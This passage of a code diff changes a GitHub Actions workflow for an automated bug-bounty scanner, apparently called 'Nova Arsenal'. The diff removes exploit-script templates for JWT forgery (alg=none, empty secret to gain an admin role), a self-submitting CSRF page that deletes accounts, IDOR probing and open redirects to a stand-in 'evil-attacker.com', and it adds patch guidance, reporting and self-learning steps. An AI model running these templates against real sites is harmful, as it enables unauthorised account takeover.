-              for oid in IDS:
-                  r = S.get(f"{{BASE}}/{{oid}}", timeout=8, allow_redirects=False)
-                  if r.status_code == 200 and len(r.text) > 50:
-                      print(f"[+] IDOR confirmed: /{{oid}} → HTTP {{r.status_code}} ({len(r.text)} bytes)")
-          ''',
-            'jwt': '''\
-          #!/usr/bin/env python3
-          """Nova Forge — JWT exploit for {target}
-          Finding: {desc}  |  CVSS: {cvss}  |  Generated: {ts}
-          """
-          import base64, json, requests, sys, hmac, hashlib
-          S = requests.Session(); S.verify = False
-          TARGET = "{url}"
-          def b64url_encode(data):
-              return base64.urlsafe_b64encode(data).rstrip(b"=")
-          def forge_none_alg(payload_data):
-              header  = b64url_encode(json.dumps({{"alg":"none","typ":"JWT"}}).encode()).decode()
-              payload = b64url_encode(json.dumps(payload_data).encode()).decode()
-              return f"{{header}}.{{payload}}."
-          def forge_hs256_empty(payload_data):
-              header  = b64url_encode(json.dumps({{"alg":"HS256","typ":"JWT"}}).encode()).decode()
-              payload = b64url_encode(json.dumps(payload_data).encode()).decode()
-              sig     = hmac.new(b"", f"{{header}}.{{payload}}".encode(), hashlib.sha256).digest()
-              return f"{{header}}.{{payload}}.{{b64url_encode(sig).decode()}}"
-          ADMIN_PAYLOAD = {{"sub":"1","role":"admin","admin":True,"iat":9999999999}}
-          if __name__ == "__main__":
-              for label, token in [("none-alg", forge_none_alg(ADMIN_PAYLOAD)),
-                                    ("empty-secret", forge_hs256_empty(ADMIN_PAYLOAD))]:
-                  r = S.get(TARGET, headers={{"Authorization": f"Bearer {{token}}"}}, timeout=10)
-                  print(f"[{{label}}] HTTP {{r.status_code}} | {{r.text[:100]}}")
-          ''',
-            'csrf': '''\
-          #!/usr/bin/env python3
-          """Nova Forge — CSRF exploit for {target}
-          Finding: {desc}  |  CVSS: {cvss}  |  Generated: {ts}
-          Generates a self-submitting HTML PoC page
-          """
-          import sys
-          TARGET  = "{url}"
-          METHOD  = "POST"
-          ORIGINS = ["https://evil-attacker.com", "null"]
-          HTML = f"""<!DOCTYPE html>
-          <html><head><title>Nova CSRF PoC</title></head><body>
-          <h1>CSRF PoC — {{TARGET}}</h1>
-          <form id="csrf" action="{{TARGET}}" method="{{METHOD}}">
-            <input name="action" value="delete_account">
-            <input name="confirm" value="yes">
-          </form>
-          <script>document.getElementById("csrf").submit();</script>
-          </body></html>"""
-          out = "csrf_poc_{domain}.html"
-          open(out, "w").write(HTML)
-          print(f"[+] CSRF PoC page written to: {{out}}")
-          print(f"    Serve with: python3 -m http.server 8080")
-          print(f"    Then open:  http://localhost:8080/{{out}}")
-          ''',
-            'open_redirect': '''\
-          #!/usr/bin/env python3
-          """Nova Forge — Open Redirect exploit for {target}
-          Finding: {desc}  |  CVSS: {cvss}  |  Generated: {ts}
-          """
-          import requests, sys
-          S = requests.Session(); S.verify = False
-          TARGET = "{url}"; PARAM = "{param}"
-          EVIL   = "https://evil-attacker.com"
-          PAYLOADS = [EVIL, f"//evil-attacker.com", f"https:evil-attacker.com",
-                      f"%0d%0ahttps://evil-attacker.com", f"///evil-attacker.com"]
-          if __name__ == "__main__":
-              for p in PAYLOADS:
-                  r = S.get(TARGET, params={{PARAM: p}}, timeout=8, allow_redirects=False)
-                  loc = r.headers.get("Location","")
-                  if "evil-attacker" in loc or r.status_code in (301,302,307,308):
-                      print(f"[+] REDIRECT: {{p}} → {{loc}} (HTTP {{r.status_code}})")
-          ''',
-          }
+          if not findings:
+            print(f'  No findings to patch for {domain}')
+            sys.exit(0)
 
-          DEFAULT_SCRIPT = '''\
-          #!/usr/bin/env python3
-          """Nova Forge — {vtype} exploit for {target}
-          Finding: {desc}  |  CVSS: {cvss}  |  Generated: {ts}
-          NOTE: Auto-generated — manually tailor payloads before use.
-          """
-          import requests, sys
-          S = requests.Session(); S.verify = False
-          TARGET = "{url}"
-          def probe():
-              r = S.get(TARGET, timeout=10)
-              print(f"HTTP {{r.status_code}} | {{len(r.text)}} bytes")
-              print(r.text[:500])
-          if __name__ == "__main__":
-              print(f"[*] Probing {vtype} on {{TARGET}}")
-              probe()
-          '''
+          # ── Run NovaPatchGenerator ──────────────────────────────────────────
+          try:
+            from nova_patch_generator import NovaPatchGenerator
+            gen     = NovaPatchGenerator()
+            patches = gen.generate_for_findings(findings)
+            out_dir = ws / 'patches'
+            out_dir.mkdir(exist_ok=True)
 
-          scripts_written = []
-          for i, f in enumerate(findings):
-            vtype  = (f.get('type') or 'unknown').lower().replace(' ','_').replace('-','_')
-            url    = f.get('url') or f.get('endpoint') or target
-            param  = f.get('parameter') or 'id'
-            desc   = f.get('description') or vtype
-            cvss   = f.get('cvss', 5.0)
-            sev    = f.get('_severity_norm', f.get('severity', 'MEDIUM'))
+            # Save JSON
+            json_path = out_dir / f'patches_{domain}_{ts}.json'
+            gen.save(patches, str(json_path))
 
-            template = SCRIPTS.get(vtype, DEFAULT_SCRIPT)
-            script   = template.format(
-              target=target, url=url, param=param,
-              desc=str(desc)[:80], cvss=cvss, ts=datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC'),
-              fname=f'exploit_{vtype}_{domain}_{i+1}.py',
-              domain=domain, vtype=vtype,
-            )
-            script   = textwrap.dedent(script)
+            # Save Markdown
+            md_path = out_dir / f'patches_{domain}_{ts}.md'
+            md_path.write_text(gen.to_markdown(patches))
 
-            fname    = f'{ws}/exploits/exploit_{vtype}_{domain}_{i+1:02d}.py'
-            os.makedirs(f'{ws}/exploits', exist_ok=True)
-            open(fname, 'w').write(script)
-            os.chmod(fname, 0o755)
-            scripts_written.append(fname)
-            print(f'  ⚒️  [{sev}] {vtype} → {os.path.basename(fname)}')
+            applied  = sum(1 for p in patches if p.get('status') == 'applied')
+            generic  = sum(1 for p in patches if p.get('status') == 'generic')
+            print(f'  ✅ NovaPatchGenerator: {len(patches)} patches | {applied} auto-applied | {generic} generic')
 
-          print(f'\n✅ Script Forge: {len(scripts_written)} exploit scripts written for {domain}')
-          # Write index
-          idx = f'{ws}/exploits/index_{domain}_{ts}.json'
-          json.dump({'target':target,'domain':domain,'scripts':scripts_written,
-                     'generated_at':datetime.utcnow().isoformat()},open(idx,'w'),indent=2)
+          except ImportError as e:
+            print(f'  nova_patch_generator import failed: {e} — running inline')
+            # Inline patch guidance for major types
+            FIXES = {
+              'sqli':              'Use parameterised queries: db.query(\'SELECT * FROM users WHERE id = ?\', [id])',
+              'xss':               'Escape output: el.textContent = input  // never innerHTML',
+              'ssrf':              'Allowlist valid domains; block 169.254.x, 127.x, 10.x, 192.168.x',
+              'idor':              'Enforce object-level auth: verify request.user.id === resource.owner_id',
+              'csrf':              'Add SameSite=Strict cookies + per-form CSRF tokens',
+              'open_redirect':     'Allowlist redirect paths; reject external URLs',
+              'jwt':               'Enforce alg in verify(); reject alg=none; use RS256 with public key',
+              'cors':              'Set Access-Control-Allow-Origin to explicit origin, not *',
+              'path_traversal':    'Resolve path, assert starts with base dir before reading',
+              'lfi':               'Whitelist allowed files; never pass user input directly to include()',
+              'prototype_pollution':'Block __proto__/constructor keys; use Object.create(null) for merges',
+              'deserialization':   'Validate/type-check after parse; avoid native deserializers on untrusted data',
+            }
+            patches = []
+            for f in findings:
+              vt = (f.get('type') or 'unknown').lower().replace(' ','_').replace('-','_')
+              patches.append({'vuln_type':vt,'fix':FIXES.get(vt,'Manual review required'),
+                               'file':f.get('file','?'),'line':f.get('line',0),
+                               'severity':f.get('_severity_norm','MEDIUM')})
+            out_dir = ws / 'patches'
+            out_dir.mkdir(exist_ok=True)
+            json.dump({'patches':patches}, open(out_dir/f'patches_{domain}_{ts}.json','w'), indent=2)
+            print(f'  Inline patches: {len(patches)}')
+          except Exception as ex:
+            print(f'  Patch generator error: {ex}')
           PYEOF
-
-            echo "  ✅ Script Forge complete for $DOMAIN"
+            echo "  ✅ Patch generator done: $DOMAIN"
           done < $NOVA_WORKSPACE/targets_this_run.txt
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 13 — REPORT GENERATION (HackerOne-ready with PoC + scripts)
-      # ══════════════════════════════════════════════════════════════════════
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 16 — REPORT GENERATION (full: findings + scripts + patches + chains)
+      # ════════════════════════════════════════════════════════════════════════
       - name: "📋 Generate HackerOne-ready reports"
         run: |
           TS=$(date -u +%Y%m%d_%H%M%S); DATE=$(date -u +%Y-%m-%d)
@@ -866,100 +1109,129 @@ jobs:
               python3 nova_report_generator.py 2>/dev/null || true
 
             python3 - <<PYEOF
-          import json,os,glob
+          import json, os, glob
           from datetime import datetime
           ws=os.environ['NOVA_WORKSPACE']; target='$TARGET'; domain='$DOMAIN'
           program=os.environ.get('NOVA_PROGRAM','unknown')
           run_url=f"https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
           ts='$TS'; date='$DATE'
 
-          findings=[]; chains=[]
+          findings=[]; chains=[]; scripts=[]; patches=[]
           for fp in glob.glob(f'{ws}/fp_filtered/verified_{domain}_*.json'):
             try: findings.extend(json.load(open(fp)).get('findings',[]))
             except: pass
           for cf in glob.glob(f'{ws}/chains/deduped_{domain}_*.json'):
             try: chains.extend(json.load(open(cf)).get('chains',[]))
             except: pass
-          scripts=[]
-          for sf in glob.glob(f'{ws}/exploits/exploit_*_{domain}_*.py'):
+          for sf in glob.glob(f'{ws}/synthesis/vuln_synthesis_{domain}_*.json'):
+            try: chains.extend(json.load(open(sf)).get('chains',[]))
+            except: pass
+          for pf in glob.glob(f'{ws}/patches/patches_{domain}_*.json'):
+            try: patches.extend(json.load(open(pf)).get('patches',[]))
+            except: pass
+          for sf in glob.glob(f'{ws}/exploits/*_{domain}_*.py'):
             scripts.append(os.path.basename(sf))
+
+          # Deduplicate chains by name
+          seen_c=set(); chains=[c for c in chains if c.get('name') not in seen_c and not seen_c.add(c.get('name'))]
 
           counts={'CRITICAL':0,'HIGH':0,'MEDIUM':0,'LOW':0,'INFO':0}
           for f in findings: counts[f.get('_severity_norm',f.get('severity','MEDIUM')).upper()] = counts.get(f.get('_severity_norm',f.get('severity','MEDIUM')).upper(),0)+1
           icon=lambda s:{'CRITICAL':'🔴','HIGH':'🟠','MEDIUM':'🟡','LOW':'🟢','INFO':'⚪'}.get(s,'⚪')
 
-          lines=['## 🦅 Nova Arsenal v2 — Verified Hunt Report','',
+          # Auto-exploit confirmed count
+          ae_confirmed=sum(1 for f in findings if f.get('auto_exploit',{}).get('confirmed'))
+
+          lines=['## 🦅 Nova Arsenal v3 — Verified Hunt Report','',
                  '| Field | Value |','|-------|-------|',
                  f'| **Target** | `{target}` |',f'| **Program** | {program} |',
                  f'| **Hunt Date** | {date} |',f'| **Run** | [View Run]({run_url}) |',
                  f'| **Verified Findings** | **{len(findings)}** |',
+                 f'| **Auto-Exploit Confirmed** | **{ae_confirmed}** |',
                  f'| **Exploit Scripts** | **{len(scripts)}** |',
-                 f'| **FP-Filtered** | ✅ |','','---','','## 📊 Summary','',
+                 f'| **Patch Guidance** | **{len(patches)}** fixes |',
+                 f'| **Attack Chains** | **{len(chains)}** |',
+                 f'| **FP-Filtered** | ✅ Yes |','','---','','## 📊 Severity Summary','',
                  '| Severity | Count |','|----------|-------|']
           lines+=[f'| {icon(s)} {s} | **{c}** |' for s,c in counts.items() if c>0]
-          lines+=[f'| **Total** | **{len(findings)}** |','','---','','## 🔗 Attack Chains','']
-          if chains:
-            for i,c in enumerate(chains,1):
-              lines+=[f'### Chain {i}: {c.get("name","?")}  ({c.get("severity","?")})',
-                      '']+([f'  {j+1}. {s}' for j,s in enumerate(c.get('steps',c.get('findings',[])))]+[''])
-          else: lines.append('*No multi-step chains.*\n')
+          lines+=[f'| **Total** | **{len(findings)}** |','','---','']
 
-          lines+=['---','','## 🎯 Findings (PoC-Confirmed, FP-Filtered)','',
-                  '| # | Type | Severity | Score | Conf | Endpoint | PoC | Script |',
-                  '|---|------|----------|-------|------|----------|-----|--------|']
+          if chains:
+            lines+=['## 🔗 Attack Chains + Synthesis','']
+            for i,c in enumerate(chains[:10],1):
+              sev=c.get('severity','?'); name=c.get('name','?').replace('_',' ')
+              result=c.get('result',c.get('description',''))
+              rw=c.get('real_world',c.get('real_world_example',''))
+              lines+=[f'### Chain {i}: {name}  |  {icon(sev)} {sev}',
+                      f'**Impact:** {result}']
+              if rw: lines.append(f'**Real-world precedent:** {rw}')
+              lines.append('')
+            lines.append('---\n')
+
+          lines+=['## 🎯 Verified Findings','',
+                  '| # | Type | Sev | Score | Conf | Auto-Exploited | Endpoint |',
+                  '|---|------|-----|-------|------|----------------|----------|']
           for i,f in enumerate(findings,1):
             typ=f.get('type','?'); sev=f.get('_severity_norm',f.get('severity','?'))
             scr=f.get('triage_score',0); cnf=f.get('confidence',0)
             url=str(f.get('url',f.get('endpoint',target)))[:55]
-            poc='✅' if (f.get('curl_poc') or f.get('poc')) else '⚠️'
-            sc_name=f'exploit_{f.get("type","x").lower().replace(" ","_")}_{domain}_{i:02d}.py'
-            sc_exists='📜' if sc_name in scripts else '—'
-            lines.append(f'| {i} | {typ} | {icon(sev)} {sev} | {scr:.1f} | {cnf:.2f} | `{url}` | {poc} | {sc_exists} |')
+            ae='🔴 YES' if f.get('auto_exploit',{}).get('confirmed') else '—'
+            lines.append(f'| {i} | {typ} | {icon(sev)} {sev} | {scr:.1f} | {cnf:.2f} | {ae} | `{url}` |')
 
-          lines+=['','---','','## 🔧 PoC Commands','']
-          for i,f in enumerate(findings,1):
-            curl=f.get('curl_poc',f.get('poc',''))
-            if curl: lines+=[f'### #{i} — {f.get("type","?")}',f'```bash\n{curl}\n```','']
+          if [f for f in findings if f.get('curl_poc') or f.get('poc')]:
+            lines+=['','---','','## 🔧 PoC Commands','']
+            for i,f in enumerate(findings,1):
+              curl=f.get('curl_poc',f.get('poc',''))
+              if curl: lines+=[f'### #{i} — {f.get("type","?")}',f'```bash\n{curl}\n```','']
 
-          lines+=['','---','','## 📜 Exploit Scripts','',
-                  '> Scripts are in the `exploits/` directory of the run artifacts.','']
-          for sc in scripts: lines.append(f'- `{sc}`')
+          if patches:
+            lines+=['','---','','## 🩹 Remediation Guidance','']
+            for p in patches[:20]:
+              vt=p.get('vuln_type','?'); fix=p.get('fix',p.get('patched_code','See patch file'))
+              lines+=[f'**{vt}**: {fix}','']
+
+          if scripts:
+            lines+=['','---','','## 📜 Exploit Scripts (in run artifacts `exploits/`)','']
+            for sc in scripts: lines.append(f'- `{sc}`')
 
           md='\n'.join(lines)
-          open(f'{ws}/reports/nova_v2_report_{domain}_{ts}.md','w').write(md)
+          open(f'{ws}/reports/nova_v3_report_{domain}_{ts}.md','w').write(md)
           json.dump({'target':target,'program':program,'date':date,'run_url':run_url,
-                     'counts':counts,'findings':findings,'chains':chains,'scripts':scripts},
-                    open(f'{ws}/reports/nova_v2_report_{domain}_{ts}.json','w'),indent=2)
-          print(f'✅ Report: {len(findings)} findings, {len(chains)} chains, {len(scripts)} scripts')
+                     'counts':counts,'findings':findings,'chains':chains,
+                     'scripts':scripts,'patches':patches,'ae_confirmed':ae_confirmed},
+                    open(f'{ws}/reports/nova_v3_report_{domain}_{ts}.json','w'),indent=2)
+          print(f'✅ Report: {len(findings)} findings | {len(chains)} chains | {len(scripts)} scripts | {len(patches)} patches')
           PYEOF
           done < $NOVA_WORKSPACE/targets_this_run.txt
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 14 — POST GITHUB ISSUES (verified + FP-filtered + scripts)
-      # ══════════════════════════════════════════════════════════════════════
-      - name: "📬 Post GitHub Issues (verified + PoC + scripts)"
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 17 — POST GITHUB ISSUES
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "📬 Post GitHub Issues (verified + PoC + scripts + patches)"
         uses: actions/github-script@v7
         with:
           github-token: ${{ secrets.GITHUB_TOKEN }}
           script: |
             const fs = require('fs'), path = require('path');
             const ws = '/root/nova_workspace/reports';
-            const exploitDir = '/root/nova_workspace/exploits';
+            const files = fs.readdirSync(ws).filter(f => f.startsWith('nova_v3_report_') && f.endsWith('.json'));
 
-            const files = fs.readdirSync(ws).filter(f => f.startsWith('nova_v2_report_') && f.endsWith('.json'));
             for (const rf of files) {
               let data;
               try { data = JSON.parse(fs.readFileSync(path.join(ws, rf), 'utf8')); } catch(e) { continue; }
-              const { findings=[], counts={}, chains=[], scripts=[], target, program, date, run_url } = data;
+              const { findings=[], counts={}, chains=[], scripts=[], patches=[], target, program, date, run_url, ae_confirmed=0 } = data;
               if (!findings.length) { console.log(`No findings for ${target}`); continue; }
 
               const icon = s => ({'CRITICAL':'🔴','HIGH':'🟠','MEDIUM':'🟡','LOW':'🟢','INFO':'⚪'}[s]||'⚪');
-              let body = `## 🦅 Nova Arsenal v2 — Verified Hunt\n\n`;
+
+              let body = `## 🦅 Nova Arsenal v3 — Verified Hunt\n\n`;
               body += `| Field | Value |\n|-------|-------|\n`;
               body += `| **Target** | \`${target}\` |\n| **Program** | ${program} |\n`;
               body += `| **Date** | ${date} |\n| **Run** | [View Run](${run_url}) |\n`;
               body += `| **Verified Findings** | **${findings.length}** |\n`;
+              body += `| **Auto-Exploit Confirmed** | **${ae_confirmed}** |\n`;
               body += `| **Exploit Scripts** | **${scripts.length}** |\n`;
+              body += `| **Patch Guidance** | **${patches.length}** fixes |\n`;
               body += `| **FP-Filtered** | ✅ Yes |\n\n---\n\n`;
 
               body += `## 📊 Summary\n\n| Severity | Count |\n|----------|-------|\n`;
@@ -968,50 +1240,60 @@ jobs:
 
               if (chains.length) {
                 body += `## 🔗 Attack Chains\n\n`;
-                chains.forEach((c,i) => { body += `### Chain ${i+1}: ${c.name||'?'} (${c.severity||'?'})\n\n`; });
+                chains.slice(0,8).forEach((c,i) => {
+                  const sev=(c.severity||'?').toUpperCase();
+                  body += `### ${i+1}. ${(c.name||'?').replace(/_/g,' ')}  |  ${icon(sev)} ${sev}\n`;
+                  body += `**Impact:** ${c.result||c.description||''}\n`;
+                  if (c.real_world||c.real_world_example) body += `**Precedent:** ${c.real_world||c.real_world_example}\n`;
+                  body += '\n';
+                });
                 body += `\n---\n\n`;
               }
 
-              body += `## 🎯 Verified Findings\n\n| # | Type | Sev | Score | Conf | Endpoint | PoC | Script |\n|---|------|-----|-------|------|----------|-----|--------|\n`;
+              body += `## 🎯 Findings\n\n| # | Type | Sev | Score | Conf | Auto-Exploited | Endpoint |\n|---|------|-----|-------|------|----------------|----------|\n`;
               findings.forEach((f,i) => {
                 const sev=(f._severity_norm||f.severity||'MEDIUM').toUpperCase();
                 const url=(f.url||f.endpoint||target).substring(0,55);
-                const poc=(f.curl_poc||f.poc)?'✅':'⚠️';
-                const sc=scripts.includes(`exploit_${(f.type||'x').toLowerCase().replace(/ /g,'_')}_${target.replace(/https?:\/\//,'').split('/')[0]}_${String(i+1).padStart(2,'0')}.py`)?'📜':'—';
-                body += `| ${i+1} | ${f.type||'?'} | ${icon(sev)} ${sev} | ${(f.triage_score||0).toFixed(1)} | ${(f.confidence||0).toFixed(2)} | \`${url}\` | ${poc} | ${sc} |\n`;
+                const ae=f.auto_exploit&&f.auto_exploit.confirmed?'🔴 YES':'—';
+                body += `| ${i+1} | ${f.type||'?'} | ${icon(sev)} ${sev} | ${(f.triage_score||0).toFixed(1)} | ${(f.confidence||0).toFixed(2)} | ${ae} | \`${url}\` |\n`;
               });
 
               const withPoc = findings.filter(f=>f.curl_poc||f.poc);
               if (withPoc.length) {
                 body += `\n---\n\n## 🔧 PoC Commands\n\n`;
-                withPoc.forEach(f => { body += `### ${f.type||'?'}\n\`\`\`bash\n${f.curl_poc||f.poc}\n\`\`\`\n\n`; });
+                withPoc.forEach(f => { body += `**${f.type||'?'}**\n\`\`\`bash\n${f.curl_poc||f.poc}\n\`\`\`\n\n`; });
+              }
+
+              if (patches.length) {
+                body += `\n---\n\n## 🩹 Remediation\n\n`;
+                patches.slice(0,15).forEach(p => {
+                  const fix = p.fix||p.patched_code||'See patch file';
+                  body += `**${p.vuln_type||'?'}**: ${fix}\n\n`;
+                });
               }
 
               if (scripts.length) {
-                body += `\n---\n\n## 📜 Exploit Scripts (in run artifacts)\n\n`;
+                body += `\n---\n\n## 📜 Exploit Scripts\n\n`;
                 scripts.forEach(s => { body += `- \`${s}\`\n`; });
               }
 
-              const domain = target.replace(/https?:\/\//,'').split('/')[0];
               const crit=counts.CRITICAL||0, high=counts.HIGH||0;
               await github.rest.issues.create({
                 owner: context.repo.owner, repo: context.repo.repo,
-                title: `[Nova v2 Verified] ${program}: ${target} | ${date} | ${crit}C ${high}H | ✅ PoC+FP+Scripts`,
+                title: `[Nova v3] ${program}: ${target} | ${date} | ${crit}C ${high}H | ${ae_confirmed} auto-exploited | ✅FullPipeline`,
                 body,
-                labels: ['nova-findings','nova-verified','nova-poc-confirmed','nova-scripts'],
+                labels: ['nova-findings','nova-verified','nova-poc-confirmed','nova-scripts','nova-patches'],
               });
-              console.log(`✅ Issue posted: ${target}`);
+              console.log(`✅ Issue: ${target}`);
             }
 
-      # ══════════════════════════════════════════════════════════════════════
-      # 15 — SELF-LEARNING FEEDBACK LOOP
-      #      Reads confirmed vs FP findings → updates hypothesis priors
-      #      nova_self_improvement.py + nova_evolver.py propose patches
-      # ══════════════════════════════════════════════════════════════════════
-      - name: "🧬 Self-learning feedback loop — update hypothesis priors"
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 18 — SELF-LEARNING FEEDBACK LOOP
+      # ════════════════════════════════════════════════════════════════════════
+      - name: "🧬 Self-learning feedback loop"
         run: |
           python3 - <<'PYEOF'
-          import json, os, glob
+          import json, os, glob, subprocess, sys
           from pathlib import Path
           from datetime import datetime
 
@@ -1019,7 +1301,6 @@ jobs:
           mem_file = ws / 'memory' / 'priors.json'
           run_url  = f"https://github.com/{os.environ.get('GITHUB_REPOSITORY','')}/actions/runs/{os.environ.get('GITHUB_RUN_ID','')}"
 
-          # ── Load existing memory ──────────────────────────────────────────
           try:
             mem = json.loads(mem_file.read_text())
           except:
@@ -1028,9 +1309,8 @@ jobs:
           mem['run_count'] = mem.get('run_count', 0) + 1
           print(f"🧬 Self-learning pass #{mem['run_count']}")
 
-          # ── Collect confirmed findings and FP data ────────────────────────
-          confirmed_types = {}   # vuln_type -> count of confirmed findings
-          fp_types        = {}   # vuln_type -> count of FP/unconfirmed
+          confirmed_types = {}
+          fp_types        = {}
 
           for fp_file in glob.glob(str(ws / 'fp_filtered' / 'verified_*.json')):
             try:
@@ -1038,53 +1318,27 @@ jobs:
               for f in data.get('findings', []):
                 vtype = (f.get('type') or 'unknown').lower().replace(' ','_').replace('-','_')
                 conf  = f.get('confidence', 0.5)
-                if conf >= 0.85:
-                  confirmed_types[vtype] = confirmed_types.get(vtype, 0) + 1
+                # Auto-exploit confirmed = highest signal
+                ae_confirmed = f.get('auto_exploit', {}).get('confirmed', False)
+                if conf >= 0.85 or ae_confirmed:
+                  confirmed_types[vtype] = confirmed_types.get(vtype, 0) + (2 if ae_confirmed else 1)
                 else:
                   fp_types[vtype] = fp_types.get(vtype, 0) + 1
             except: pass
 
-          for rf in glob.glob(str(ws / 'reports' / '*.json')):
-            try:
-              data = json.load(open(rf))
-              for f in data.get('findings', []):
-                vtype = (f.get('type') or 'unknown').lower().replace(' ','_').replace('-','_')
-                conf  = f.get('confidence', 0.5)
-                if conf < 0.85:
-                  fp_types[vtype] = fp_types.get(vtype, 0) + 1
-            except: pass
+          LEARNING_RATE = 0.12
+          MIN_PRIOR, MAX_PRIOR = 0.05, 0.95
+          updated = []
 
-          print(f"  Confirmed: {sum(confirmed_types.values())} findings across {len(confirmed_types)} types")
-          print(f"  FP/unconf: {sum(fp_types.values())} findings across {len(fp_types)} types")
-
-          # ── Bayesian prior update ─────────────────────────────────────────
-          # For each vuln type seen this run, update its adjusted_prior:
-          #   If it confirmed more than expected → raise prior
-          #   If it had more FP than expected    → lower prior
-          LEARNING_RATE = 0.10   # how aggressively to shift the prior
-          MIN_PRIOR     = 0.05
-          MAX_PRIOR     = 0.95
-
-          all_types = set(list(confirmed_types.keys()) + list(fp_types.keys()))
-          updated   = []
-
-          for vtype in all_types:
+          for vtype in set(list(confirmed_types.keys()) + list(fp_types.keys())):
             n_conf = confirmed_types.get(vtype, 0)
             n_fp   = fp_types.get(vtype, 0)
             total  = n_conf + n_fp
             if total == 0: continue
-
-            # Empirical success rate this run
-            empirical_rate = n_conf / total
-
-            # Get current prior (from memory or default 0.35)
-            existing = mem['priors'].get(vtype, {})
-            current_prior = existing.get('adjusted_prior', 0.35)
-
-            # Bayesian update: move current prior toward empirical rate
-            new_prior = current_prior + LEARNING_RATE * (empirical_rate - current_prior)
-            new_prior = max(MIN_PRIOR, min(MAX_PRIOR, new_prior))
-
+            empirical      = n_conf / total
+            existing       = mem['priors'].get(vtype, {})
+            current_prior  = existing.get('adjusted_prior', 0.35)
+            new_prior      = max(MIN_PRIOR, min(MAX_PRIOR, current_prior + LEARNING_RATE * (empirical - current_prior)))
             mem['priors'][vtype] = {
               'adjusted_prior':  round(new_prior, 4),
               'confirmed_total': existing.get('confirmed_total', 0) + n_conf,
@@ -1092,142 +1346,113 @@ jobs:
               'last_updated':    datetime.utcnow().isoformat(),
               'run_count':       existing.get('run_count', 0) + 1,
             }
-
             direction = '⬆️' if new_prior > current_prior else '⬇️'
             updated.append((vtype, current_prior, new_prior))
-            print(f"  {direction} {vtype}: {current_prior:.3f} → {new_prior:.3f}  "
-                  f"(confirmed:{n_conf}, fp:{n_fp})")
+            print(f"  {direction} {vtype}: {current_prior:.3f} → {new_prior:.3f}  (conf:{n_conf}, fp:{n_fp})")
 
-          # ── Record lesson ─────────────────────────────────────────────────
-          lesson = {
-            'run': mem['run_count'],
-            'run_url': run_url,
-            'date': datetime.utcnow().isoformat(),
-            'confirmed_types': confirmed_types,
-            'fp_types': fp_types,
-            'prior_updates': {vt: {'from': old, 'to': new} for vt, old, new in updated},
-          }
+          lesson = {'run': mem['run_count'], 'run_url': run_url,
+                    'date': datetime.utcnow().isoformat(),
+                    'confirmed_types': confirmed_types, 'fp_types': fp_types,
+                    'prior_updates': {vt: {'from':old,'to':new} for vt,old,new in updated}}
           mem['lessons'].append(lesson)
-          mem['lessons'] = mem['lessons'][-50:]   # keep last 50 runs
-
-          # ── Save updated memory ───────────────────────────────────────────
+          mem['lessons'] = mem['lessons'][-50:]
           mem_file.write_text(json.dumps(mem, indent=2))
-          print(f"\n✅ Memory updated: {len(updated)} priors adjusted, {mem['run_count']} total runs")
+          print(f"\n✅ Memory updated: {len(updated)} priors, run #{mem['run_count']}")
 
-          # ── Also run nova_self_improvement.py if available ────────────────
-          import subprocess, sys
+          # Run nova_self_improvement.py
           r = subprocess.run([sys.executable, 'nova_self_improvement.py'],
                               capture_output=True, text=True, timeout=120)
-          if r.returncode == 0 and r.stdout:
-            print(f"nova_self_improvement.py output:\n{r.stdout[-1000:]}")
+          if r.stdout: print(r.stdout[-1000:])
+
+          # Run nova_evolver.py (dry_run=True — propose patches, don't apply)
+          r2 = subprocess.run([sys.executable, '-c', '''
+          try:
+            from nova_evolver import NovaEvolver
+            e = NovaEvolver(dry_run=True, repo_path=".")
+            result = e.evolve(max_patches=3, improvement_goal="reduce false positives and improve exploit reliability")
+            print(f"Evolver: {result}")
+          except Exception as ex:
+            print(f"Evolver skipped: {ex}")
+          '''], capture_output=True, text=True, timeout=120)
+          if r2.stdout: print(r2.stdout)
           PYEOF
 
-          # ── nova_evolver.py — propose code improvement patches ─────────────
-          python3 -c "
-          import importlib, sys, os
-          evolver = None
-          try:
-            evolver = importlib.import_module('nova_evolver')
-            if hasattr(evolver, 'NovaEvolver'):
-              e = evolver.NovaEvolver(dry_run=True, repo_path='.')
-              result = e.evolve(max_patches=3, improvement_goal='reliability and false-positive reduction')
-              print(f'Evolver proposals: {result}')
-          except Exception as ex:
-            print(f'Evolver skipped: {ex}')
-          " 2>/dev/null || true
-
-      # ══════════════════════════════════════════════════════════════════════
-      # 16 — COMMIT UPDATED MEMORY BACK TO REPO
-      # ══════════════════════════════════════════════════════════════════════
+      # ════════════════════════════════════════════════════════════════════════
+      # STEP 19 — COMMIT SELF-LEARNING MEMORY
+      # ════════════════════════════════════════════════════════════════════════
       - name: "💾 Commit self-learning memory to repo"
         run: |
           MEM=$NOVA_WORKSPACE/memory/priors.json
-          if [ ! -f "$MEM" ]; then echo "No memory to commit"; exit 0; fi
-
+          [ ! -f "$MEM" ] && echo "No memory file" && exit 0
           CONTENT=$(base64 -w0 "$MEM")
           DATE=$(date -u +%Y-%m-%d)
-
-          # Get current SHA of the file in repo (if it exists)
-          SHA=$(curl -s \
-            -H "Authorization: Bearer $GITHUB_TOKEN" \
+          SHA=$(curl -s -H "Authorization: Bearer $GITHUB_TOKEN" \
             -H "Accept: application/vnd.github+json" \
             "https://api.github.com/repos/$GITHUB_REPOSITORY/contents/nova_self_improvement_memory.json" \
-            | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('sha',''))" 2>/dev/null || true)
-
-          PAYLOAD_BASE="{\"message\":\"chore: self-learning memory update — run ${GITHUB_RUN_ID} (${DATE})\",\"content\":\"${CONTENT}\",\"branch\":\"main\"}"
+            | python3 -c "import sys,json; print(json.load(sys.stdin).get('sha',''))" 2>/dev/null || true)
           if [ -n "$SHA" ]; then
-            PAYLOAD="{\"message\":\"chore: self-learning memory update — run ${GITHUB_RUN_ID} (${DATE})\",\"content\":\"${CONTENT}\",\"sha\":\"${SHA}\",\"branch\":\"main\"}"
+            PAYLOAD="{\"message\":\"chore: self-learning memory — run ${GITHUB_RUN_ID} (${DATE})\",\"content\":\"${CONTENT}\",\"sha\":\"${SHA}\",\"branch\":\"main\"}"
           else
-            PAYLOAD="$PAYLOAD_BASE"
